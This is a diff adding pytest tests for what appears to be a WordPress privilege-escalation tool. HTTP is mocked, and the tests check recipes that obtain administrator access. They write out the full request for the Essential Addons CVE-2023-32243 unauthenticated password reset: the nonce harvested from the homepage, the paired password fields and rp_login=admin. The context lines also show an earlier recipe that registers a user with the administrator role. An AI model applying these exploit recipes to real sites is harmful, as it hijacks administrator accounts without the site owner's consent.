@@ -214,3 +214,71 @@ def test_register_role_harvests_nonce_and_sends_extra_and_confirm_fields():
     assert data["role"] == "administrator" and data["action"] == "opalestate_register_form"
     assert data["confirmed_register"] == "on" and data["ajax"] == "1"
     assert out == {"username": "svc_a", "password": "pw12345678"}
+
+
+# ── password-reset with a page-harvested JS nonce + confirm field ─────────────
+# Essential Addons CVE-2023-32243: reset_password() on `init` sets any user's
+# password without validating rp_key, gated only by a nonce (action
+# 'essential-addons-elementor') that is printed on the homepage as
+# `var localize = {..."nonce":"..."}` and two matching password fields
+# (eael-pass1 / eael-pass2). Both values source+live confirmed on cve-essaddons.
+def test_password_reset_harvests_js_nonce_and_sends_confirm_field():
+    http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200,
+        text='<script>var localize = {"ajaxurl":"/wp-admin/admin-ajax.php",'
+             '"nonce":"a1b2c3d4e5","i18n":{}}</script>')
+    http.post.return_value = MagicMock(status_code=200,
+        text='{"success":true,"data":{"message":"Your password has been reset."}}')
+    r = {"kind": "password-reset", "endpoint": "/wp-admin/admin-ajax.php",
+         "target_user": "admin", "user_param": "rp_login",
+         "pass_param": "eael-pass1", "pass_confirm_param": "eael-pass2",
+         "params": {"action": "login_or_register_user",
+                    "eael-resetpassword-submit": "1", "page_id": "124", "widget_id": "224"},
+         "nonce_from": {"url": "/", "key": "nonce", "param": "eael-resetpassword-nonce"}}
+    out = wp_privesc.acquire_admin("https://t", http, r)
+    assert out["username"] == "admin" and len(out["password"]) > 8
+    assert http.get.call_args[0][0] == "https://t/"          # harvested from homepage
+    data = http.post.call_args.kwargs["data"]
+    assert data["eael-resetpassword-nonce"] == "a1b2c3d4e5"
+    assert data["eael-pass1"] == out["password"]
+    assert data["eael-pass2"] == out["password"]             # confirm mirrors password
+    assert data["rp_login"] == "admin"
+    assert data["action"] == "login_or_register_user"
+    assert data["eael-resetpassword-submit"] == "1"
+    assert data["page_id"] == "124" and data["widget_id"] == "224"
+
+
+def test_password_reset_without_nonce_from_does_not_fetch_a_page():
+    # the original password-reset shape (no nonce harvest, no confirm) must not regress
+    http = MagicMock()
+    r = {"kind": "password-reset", "endpoint": "/wp-json/x/reset",
+         "target_user": "admin", "user_param": "user", "pass_param": "np"}
+    out = wp_privesc.acquire_admin("https://t", http, r)
+    assert out["username"] == "admin"
+    http.get.assert_not_called()          # no nonce_from → no page fetch
+    data = http.post.call_args.kwargs["data"]
+    assert data["user"] == "admin" and data["np"] == out["password"]
+    assert "np" in data and out["password"] == data["np"]
+
+
+def test_essential_addons_registry_recipe_wires_end_to_end():
+    # Uses the REAL registry recipe to catch wiring bugs between wp_recipes'
+    # field names and what _password_reset expects.
+    http = MagicMock()
+    http.get.return_value = MagicMock(status_code=200,
+        text='var localize = {"ajaxurl":"x","nonce":"eanonce99","i18n":{}}')
+    http.post.return_value = MagicMock(status_code=200,
+        text='{"success":true,"data":{"message":"Your password has been reset."}}')
+    r = wp_recipes.find_privesc("essential-addons-for-elementor-lite")[0]
+    assert r["cve"] == "CVE-2023-32243"
+    out = wp_privesc.acquire_admin("https://t", http, r)
+    assert out["username"] == "admin" and len(out["password"]) > 8
+    assert http.get.call_args[0][0] == "https://t/"
+    data = http.post.call_args.kwargs["data"]
+    assert data["action"] == "login_or_register_user"
+    assert data["eael-resetpassword-submit"] == "1"
+    assert data["eael-resetpassword-nonce"] == "eanonce99"
+    assert data["eael-pass1"] == out["password"]
+    assert data["eael-pass2"] == out["password"]
+    assert data["rp_login"] == "admin"
+    assert data["page_id"] == "124" and data["widget_id"] == "224"
